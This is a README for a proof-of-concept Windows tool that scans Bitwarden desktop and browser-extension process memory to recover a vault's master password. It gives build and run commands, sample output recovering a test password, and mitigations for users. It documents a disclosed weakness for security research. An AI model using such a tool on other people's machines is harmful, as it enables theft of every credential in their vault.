# BW-Dump

A proof-of-concept tool that extracts the master password from a locked Bitwarden vault (must be unlocked at least once), only tested and supported on Windows 10 and 11.

## Update (07/02/23)
The tool now supports the latest version of Bitwarden Desktop (2023.1.1) on Windows 10 and 11.

![bitwarden-desktop-password-recovery-edit](https://user-images.githubusercontent.com/9108334/217886463-34460959-73b5-4f4a-bb14-504fe4ac0ded.png)

Bitwarden Desktop version info.

![bw-desktop-version](https://user-images.githubusercontent.com/9108334/217309342-42fa29d5-816b-40f5-9f10-bc5a457c7e44.png)


## Update (21/09/22)
A recent security update (not sure which one exactly) has fixed the issue on the web browser extension. However, on versions `v2022.6.0` and below it should still work.

## Demo
A short demo of using bw-dump with Microsoft Edge and the Bitwarden browser extension.

https://user-images.githubusercontent.com/9108334/191377244-f0e9a123-e4f0-43b0-90b5-697fc005ae7b.mov

## Building
**Warning: Windows Defender may report the compiled binary as malicious!**

To build on a system other than Windows:
```bash
env GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
```

Otherwise, run `go build -ldflags="-s -w"` which builds a stripped binary.

## Running
Simply build and execute the binary. It does NOT require admin rights. Make sure, a Chromium browser is running and the Bitwarden extension is installed. In addition, the vault needs to be unlocked at least once. After which, the master password will be stored in memory for a period of time. 

You can also pass the `-d` option to dump memory regions when a pattern is found. For each result, a filename `dump-pid-<PID>-<MEM-REGION>.hex` is created in the current working directory.

**Example Output**
```bash
PS C:\Users\Tester\dev\go\bw-dump> bw-dump.exe

 888 88b, Y8b Y8b Y888P    888 88e
 888 88P'  Y8b Y8b Y8P     888 888b  8888 8888 888 888 8e  888 88e 
 888 8K     Y8b Y8b Y  888 888 8888D 8888 8888 888 888 88b 888 888b
 888 88b,    Y8b Y8b       888 888P  Y888 888P 888 888 888 888 888P
 888 88P'     Y8P Y        888 88"    "88 88"  888 888 888 888 88" 
                                                           888     
            Created by @NazMarkuta at Red Maple            888     
    
BW-Dump is a Windows forensics tool that extracts Bitwarden master passwords from locked vaults
(must be unlocked at least once) by reading process memory using Windows API functions which
searches for magic byte patterns. The tool doesn't require any special (admin) permissions.

Now supports Bitwarden Desktop App (v2023.1.1) running on Windows 10 or 11. The tool (may) 
still support older Bitwarden Chromium extension versions (v2022.6.0) and below.

[+] Searching for processes...
[+] PID: 4228
[+] EXEName: Bitwarden.exe
[+] CMDLine: "C:\Users\Tester\AppData\Local\Programs\Bitwarden\Bitwarden.exe" --type=renderer --user-data-dir="C:\Users\Tester\AppData\Roaming\Bitwarden" --app-path="C:\Users\Tester\AppData\Local\Programs\Bitwarden\resources\app.asar" --no-sandbox --no-zygote --first-renderer-process --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=4 --time-ticks-at-unix-epoch=-1675782335888921 --launch-time-ticks=4007177473 --mojo-platform-channel-handle=2508 --field-trial-handle=1792,i,3673052334935287551,6849534636950916074,131072 --disable-features=SpareRendererForSitePerProcess,WinRetrieveSuggestionsOnlyOnDemand /prefetch:1

[+] Searching PID memory (4228)
[+] Found pattern at MemBaseAddr (0xb0800554000)
[+] Found password prefix bytes at offset (0xc121)
[!] Invalid offset size, skipping...

[+] Found pattern at MemBaseAddr (0xb0800a8c000)
[+] Found password prefix bytes at offset (0x1104)
[!] Invalid offset size, skipping...

[+] Found pattern at MemBaseAddr (0xb08014bc000)
[+] Found password prefix bytes at offset (0x62aa)
[+] Password recovered: "SUPER-SECURE-password8"

PS C:\Users\Tester\dev\go\bw-dump> 
```

## Is there a solution or workaround?
There are two ways (probably more) the master password can be trashed from memory:
1. Once locked, enter any random WRONG password. This should replace your password stored in memory.
2. Terminate the `Bitwarden.exe` process which Windows should do some garbage collection.

## What's next?
- Create a Volaility3 plugin that can extract master passwords from saved memory dumps.
